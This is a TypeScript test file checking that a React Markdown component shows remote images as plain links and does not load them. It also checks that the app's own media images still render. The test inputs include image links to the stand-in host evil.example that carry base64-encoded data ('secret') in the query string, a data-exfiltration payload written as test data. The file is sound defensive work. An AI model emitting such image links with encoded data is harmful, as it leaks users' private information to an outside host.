import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { Markdown } from "./Markdown";

(globalThis as unknown as { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

let container: HTMLDivElement;
let root: Root;

beforeEach(() => {
  window.history.replaceState({}, "", "/app/");
  container = document.createElement("div");
  document.body.appendChild(container);
  root = createRoot(container);
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
});

const render = async (md: string) => {
  await act(async () => {
    root.render(<Markdown>{md}</Markdown>);
  });
  // The DS renders through streamdown, which settles a tick later.
  await act(async () => {
    await new Promise((r) => setTimeout(r, 50));
  });
};

describe("<Markdown> never loads an image from another host on sight", () => {
  it("a remote image (markdown or raw HTML) reaches the DOM as a link, with no <img>", async () => {
    await render(
      [
        "before ![chart](https://evil.example/p.png?d=c2VjcmV0) after",
        "",
        '<img src="https://evil.example/raw.png?d=x" alt="raw">',
      ].join("\n"),
    );
    const remote = [...container.querySelectorAll("img")].filter((i) =>
      (i.getAttribute("src") || "").includes("evil.example"),
    );
    expect(remote).toEqual([]);
    expect(container.textContent).toContain("chart — image from evil.example");
    expect(container.textContent).toContain("image from evil.example");
  });

  it("the agent's own media still renders as an image", async () => {
    await render("![chart](/media/chart.png?sig=abc)");
    const own = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(own).toContain("/media/chart.png?sig=abc");
  });
});
